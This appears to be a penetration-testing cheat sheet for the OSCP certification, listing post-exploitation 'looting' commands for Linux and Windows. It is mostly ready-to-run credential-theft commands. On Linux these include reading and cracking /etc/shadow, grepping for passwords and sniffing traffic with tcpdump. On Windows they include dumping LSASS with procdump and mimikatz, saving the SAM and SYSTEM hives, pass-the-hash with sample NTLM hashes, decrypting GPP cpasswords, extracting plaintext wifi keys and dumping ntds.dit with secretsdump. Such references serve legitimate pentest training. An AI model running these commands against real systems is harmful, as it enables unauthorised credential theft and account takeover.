# Loot Linux

## OSCP Proof

```
hostname && whoami && cat proof.txt && /sbin/ifconfig
hostname && whoami && cat local.txt && /sbin/ifconfig
```

## Hashes

### Shadow
```
cat /etc/passwd
cat /etc/shadow
unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Old passwords in /etc/security/opasswd
The `/etc/security/opasswd` file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.

Treat your opasswd file like your **/etc/shadow** file because it will end up containing user password hashes

## Hashes in databases

MySQL example:
```
mysql -u root -p -h $ip
use "Users"  
show tables;  
select \* from users;
```

## Passwords

### Files containing passwords
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

### In memory passwords
* `strings /dev/mem -n10 | grep -i PASS`
* [Mimipenguin](https://github.com/huntergregal/mimipenguin)

## Interesting files

### Find sensitive files
```
find / -name *.txt
find / -name *.zip
find / -name *.doc
find / -name *.xls
find / -name config*
find / -name *.rar
find / -name *.docx
find / -name *.sql
find / -name *password*
```

```
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original
/lib/live/config/0031-root-password
```

### History

```
locate .bash_history
locate .nano_history
locate .atftp_history
locate .mysql_history
locate .php_history
locate .viminfo
```

### SSH

```
locate .ssh
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
```

### Last edited files

Files that were edited in the last 10 minutes
```
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

### Log files

```
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 

/usr/local/apache/logs/access_log 
/usr/local/apache/logs/access.log 

/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log

/var/log/access_log
/var/log/dmessage
/var/log/auth.log
```

### Memory

```
/proc/sched_debug # Can be used to see what processes the machine is running
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

## Mails

```
/var/mail
/var/spool/mail
```

POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet:
```
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean
 
 list
 
 +OK 2 1807
 1 786
 2 1021

 retr 1
 
 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```

## Sniff passwords

### TcpDump

Fast command:
```
tcpdump -i any -s0 -w capture.pcap
```

Inspect web traffic:
```
tcpdump tcp port 80 -w output.pcap -i eth0
```

This will grep all GET from the wlan0 interface:
```
tcpdump -i wlan0 -vvv -A | grep "GET"
```

Print the traffic in hex with ascii interpretation:
```
tcpdump -nX -r file.pcap
```

### Extract passwords from PCAP

* https://github.com/DanMcInerney/net-creds
* https://www.offensive-security.com/metasploit-unleashed/password-sniffing/

# Loot Windows

## OSCP Proof
```
hostname && whoami.exe && type proof.txt && ipconfig /all
hostname && whoami.exe && type local.txt && ipconfig /all
```

## Hashes

### fgdump.exe

We can use `fgdump.exe` (`locate fgdump.exe` on kali) to extract NTLM and LM Password hashes. Run it and there is a file called 127.0.0.1.pwndump where the hash is saved. Now you can try to brute force it. 

### Windows Credencial Editor (WCE)

WCE can steal NTLM passwords from memory in cleartext! There are different versions of WCE, one for 32 bit systems and one for 64 bit. So make sure you have the right one.

You can run it like this
```
wce32.exe -w
```

## Hives

### Loot hives without tools

This might be a better technique than using tools like wce and fgdump, since you don't have to upload any binaries. Get the registry:
```
C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
C:\> reg.exe save hklm\security c:\windows\temp\security.save
C:\> reg.exe save hklm\system c:\windows\temp\system.save
```

The hashes can be extracted using `secretdump.py` or `pwdump`

### Dump cached credentials

```
root@kali:~# cachedump
usage: /usr/bin/cachedump <system hive> <security hive>
```

### Dump LSA secrets

```
root@kali:~# lsadump
usage: /usr/bin/lsadump <system hive> <security hive>
```

Here, you will find account passwords for services that are set to run under actual Windows user accounts (as opposed to Local System, Network Service and Local Service), the auto-logon password and more.

If the Windows host is part of a domain, you will find the domain credentials of the machine account with which you can authenticate to the domain to list domain users and admins as well as browsing shares and so on.

Use [pth](http://code.google.com/p/passing-the-hash/) on Kali Linux or [wce](http://www.ampliasecurity.com/research/wcefaq.html) on your own Windows system to use these credentials.

```
pth-net rpc user -U 'securus\john-pc$%aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f' -S dc1.securus.corp.com
```

Browse shares for passwords, look on the domain controller for passwords in Group Policy Preferences (GPP) that can be [decrypted](http://carnal0wnage.attackresearch.com/2012/10/group-policy-preferences-and-getting.html):
```
C:\> wce.exe -s john-pc:securus:aad3b435b51404eeaad3b435b51404ee:2fb3672702973ac1b9ade0acbdab432f
C:\> findstr /S cpassword \\dc1.securus.corp.com\sysvol\*.xml
\\192.168.122.55\sysvol\securus.corp.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml: ="" description="" cpassword="1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="1" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/>
C:\> ruby gppdecrypt.rb 1MJPOM4MqvDWWJq5IY9nJqeUHMMt6N2CUtb7B/jRFPs
1q2w3e4r5t
```

### Dump password hashes

The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.
```
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Generate a hash file for John using `pwdump` or `samdump2`.
```
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Then crack it with `john -format=NT /root/sam.txt`.

## Passwords

### Mimikatz

```
mimikatz # privilege::debug
mimikatz # log sekurlsa.log
mimikatz # sekurlsa::logonpasswords
```

### In-Memory Credentials

Dump clear-text passwords from memory using mimikatz and the Windows Task Manager to dump the LSASS process.
```
C:\> procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp 2>&1
```

Then dump the credentials offline using mimikatz and its minidump module:
```
C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit
```

### Credential Manager

When a user authenticates to a network share, a proxy, or uses a piece of client software and ticks the “Remember my password” box, the password is typically stored in an encrypted vault using the Windows Data Protection API. You can see every saved credential in the Credential Manager (accessed through User Accounts in the Control Panel), and you can dump them with [Network Password Recovery](http://www.nirsoft.net/utils/network_password_recovery.html). Remember to run the [64-bit version](http://www.nirsoft.net/utils/netpass-x64.zip) on a 64-bit Windows instances, or you won’t get them all.

Sometimes, the user might have save his credentials in the memory while using “runas /savecred” option. We could check this by:
```
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

### Search for file contents

```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
findstr /si pass *.txt | *.xml | *.ini
```

### Protected Storage

Dump any passwords remembered in IE, Outlook or MSN using [Protected Storage PassView](http://www.nirsoft.net/utils/pspv.html)

### Passwords stored in services

Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)
```
https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

### Third-party software

NirSoft offers many [tools](http://nirsoft.net/utils/index.html#password_utils) to recover passwords stored by third-party software.

### Passwords in unattend.xml

Location of the `unattend.xml` files
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\sysprep\sysprep.xml
```

```
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### IIS Web config

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

### Search the registry for key names and passwords

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver" # RealVNC
reg query "HKEY_CURRENT_USER\Software\TightVNC\Server" # TightVNC
reg query "HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4" # TigerVNC
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Wifi passwords

Find AP SSID
```
netsh wlan show profile
```

Get Cleartext Pass
```
netsh wlan show profile <SSID> key=clear
```

Oneliner method to extract wifi passwords from all the access point.
```
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

## Interesting files

### Find sensitive files
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

These are common files to find them in. They might be base64-encoded. So look out for that.
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files?
```
dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
```
```
Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
```

### Search for a file with a certain filename
```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
dir /S /B *.txt == *.zip == *.doc == *.docx == *.rar == *.xls == *.sql == config*
where /R C:\ user.txt
where /R C:\ *.ini
```

### Logs & Sessions

```
c:\Program Files\Apache Group\Apache\logs\access.log  
c:\Program Files\Apache Group\Apache\logs\error.log
```

```
c:\WINDOWS\TEMP\  
c:\php\sessions\  
c:\php5\sessions\  
c:\php4\sessions\
```

IIS Logs:
```
C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
```

Any Apache web logs?:
```
dir /s access.log error.log
```
```
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

## Misc

### Look for file shares

```
Net shares
```

### Enumerate users and computers using powershell

```
Get-ADComputer -Filter * -Properties *  | Select-Object @{Label = "Computer Name";Expression = {$_.Name}},@{Label = "Last Logon Date";Expression = {$_.LastLogonDate}} 
Get-ADUser -Filter * -Properties *  | Select-Object @{Label = "Logon Name";Expression = {$_.sAMAccountName}},  
                  @{Label = "Last LogOn Date";Expression = {$_.LastLogonDate.ToString('yyyy-MM-dd')}}, 
                  @{Label = "Created Date";Expression = {$_.whenCreated.ToString('yyyy-MM-dd')}}, 
                  @{Label = "7 Month Dormant";Expression = {if (( $_.LastLogonDate -gt 1990/01/01 -and $_.LastLogonDate -lt $time)  ) {'True'} Else {'False'}}}, 
                  @{Label = "Password Expire";Expression = {if (($_.PasswordNeverExpires -eq 'TRUE')  ) {'Enabled'} Else {'Disabled'}}}, # the 'if statement# replaces $_.Enabled 
                  @{Label = "Account Status";Expression = {if (($_.Enabled -eq 'TRUE')  ) {'Enabled'} Else {'Disabled'}}}, # the 'if statement# replaces $_.Enabled  
                  @{Label = "Admin User";Expression =  {if (($_.adminCount -eq '1')  ) {'TRUE'} Else {'FALSE'}}}, # the 'if statement# replaces $_.Enabled 
                  @{Label = "Description";Expression = {$_.Description}},  
                  @{Label = "Applications";Expression = {$_.info}}, 
                  @{Label = "First Name";Expression = {$_.GivenName}},   
                  @{Label = "Last Name";Expression = {$_.Surname}},  
                  @{Label = "Display Name";Expression = {$_.DisplayName}}, 
                  @{Label = "Job Title";Expression = {$_.Title}},  
                  @{Label = "Company";Expression = {$_.Company}}, 
                  @{Label = "Department";Expression = {$_.Department}},  
                  @{Label = "Office";Expression = {$_.OfficeName}},  
                  @{Label = "Phone";Expression = {$_.telephoneNumber}},  
                  @{Label = "Email";Expression = {$_.Mail}}
```

### Decrypting VNC Password
```
wine vncpwdump.exe -k key
```

### Group Policy Preferences (GPP)

A common useful misconfiguration found in modern domain environments is unprotected Windows GPP settings files

* Map the Domain controller SYSVOL share
```net use z:\\dc01\SYSVOL```

* Find the GPP file: Groups.xml
```dir /s Groups.xml```

* Review the contents for passwords
```type Groups.xml```

* Decrypt using GPP Decrypt
```gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB```

### Dump the AD

```
impacket-secretsdump -system 'root/Documents/OSCP/10.11.X.XXX/system.save' -ntds '/root/Documents/OSCP/10.11.X.XXX/ntds.dit' LOCAL
```

# References

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/2b1900e046daa89d2ac31e108f001df80e0ccc43/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#looting-for-passwords
* https://sushant747.gitbooks.io/total-oscp-guide/tcp-dumps_on_pwnd_machines.html
* https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5455c30ec7ef7aa4a4e17959709469941ada8379/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
* https://sushant747.gitbooks.io/total-oscp-guide/loot_windows_-_for_credentials_and_other_stuff.html
* https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
* https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html
* https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md#file-transfers
* https://bitvijays.github.io/LFC-VulnerableMachines.html
* https://0xdarkvortex.dev/index.php/2018/04/17/31-days-of-oscp-experience/
* https://ben.the-collective.net/oscp-notes/windows/